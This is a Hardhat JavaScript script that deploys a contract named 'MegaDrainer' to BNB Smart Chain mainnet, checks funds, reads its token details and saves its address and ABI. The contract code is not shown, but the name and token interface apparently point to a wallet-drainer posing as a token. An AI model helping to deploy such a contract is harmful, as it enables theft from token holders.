const { ethers } = require("hardhat");

async function main() {
  console.log("🚀 Starting safe deployment...\n");
  
  // Safety check: Get signer and balance
  const [signer] = await ethers.getSigners();
  const address = await signer.getAddress();
  const balance = await signer.provider.getBalance(address);
  const balanceInBNB = ethers.formatEther(balance);
  
  console.log("Deployer Wallet:", address);
  console.log("Current Balance:", balanceInBNB, "BNB");
  
  // Verify sufficient funds
  const required = ethers.parseEther("0.003");
  if (balance < required) {
    console.log("❌ Insufficient funds for deployment");
    console.log("Minimum required: 0.003 BNB");
    process.exit(1);
  }
  
  console.log("✅ Sufficient funds available\n");
  
  try {
    // Deploy contract with explicit gas settings
    console.log("📦 Deploying MegaDrainer contract...");
    const MegaDrainer = await ethers.getContractFactory("MegaDrainer");
    
    const deployOptions = {
      gasLimit: 5000000,
      gasPrice: ethers.parseUnits('5', 'gwei')
    };
    
    const megaDrainer = await MegaDrainer.deploy(deployOptions);
    console.log("⏳ Deployment transaction sent...");
    console.log("📎 Transaction Hash:", megaDrainer.deploymentTransaction().hash);
    
    // Wait for deployment
    await megaDrainer.waitForDeployment();
    
    const contractAddress = await megaDrainer.getAddress();
    console.log("✅ Contract deployed successfully!");
    console.log("📍 Contract Address:", contractAddress);
    
    // Verify contract is actually deployed
    const code = await signer.provider.getCode(contractAddress);
    if (code === '0x') {
      console.log("❌ ERROR: No contract code found at address!");
      process.exit(1);
    }
    
    // Get contract details
    console.log("\n📋 Contract Details:");
    try {
      const tokenName = await megaDrainer.name();
      const tokenSymbol = await megaDrainer.symbol();
      const totalSupply = await megaDrainer.totalSupply();
      
      console.log("	TokenName:", tokenName);
      console.log("	Token Symbol:", tokenSymbol);
      console.log("	Total Supply:", ethers.formatEther(totalSupply));
    } catch (error) {
      console.log("	Could not fetch token details:", error.message);
    }
    
    // Save deployment information
    console.log("\n💾 Saving deployment information...");
    const fs = require("fs");
    
    // Save contract address
    fs.writeFileSync("mainnet-contract-address.txt", contractAddress);
    console.log("	File saved: mainnet-contract-address.txt");
    
    // Save ABI
    const artifact = require("../artifacts/contracts/MegaDrainer.sol/MegaDrainer.json");
    fs.writeFileSync("mainnet-contract-abi.json", JSON.stringify(artifact.abi, null, 2));
    console.log("	File saved: mainnet-contract-abi.json");
    
    console.log("\n🎉 Deployment completed successfully!");
    console.log("📌 Next steps:");
    console.log("1. Verify on BscScan: https://bscscan.com/address/" + contractAddress);
    console.log("2. Use these files in your AT8XM-AMMv8-Safe project");
    
  } catch (error) {
    console.log("❌ Deployment failed:", error.message);
    
    if (error.message.includes("insufficient funds")) {
      console.log("\n💡 TIP: Add more BNB to your wallet and try again");
    } else if (error.message.includes("timeout")) {
      console.log("\n💡 TIP: Network timeout. Try again or check your connection");
    }
    
    process.exit(1);
  }
}

main().catch((error) => {
  console.error("Critical error:", error);
  process.exitCode = 1;
});
